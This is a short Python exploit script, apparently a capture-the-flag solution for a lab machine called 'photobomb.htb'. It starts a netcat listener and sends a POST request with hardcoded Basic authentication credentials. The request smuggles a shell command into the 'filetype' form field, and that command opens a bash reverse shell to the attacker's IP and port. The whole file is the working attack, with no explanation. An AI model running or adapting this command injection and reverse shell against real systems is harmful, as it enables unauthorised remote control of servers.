#!/usr/bin/python3
import requests, sys, os, threading

def help():

	print ('Usage python3 photobomb.py <attacker ip> <attacker port>')

def nc():

	os.system('nc -lvp ' + attacker_port)
	
try:

	attacker_ip=sys.argv[1]
	attacker_port=sys.argv[2]

except:

	help()
	sys.exit(1)

t = threading.Thread(target=nc)
t.start()
headers = {'Authorization':'Basic cEgwdDA6YjBNYiE='}
payload = 'photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26&dimensions=3000x2000'
requests.post('http://photobomb.htb/printer', headers=headers, data=payload)
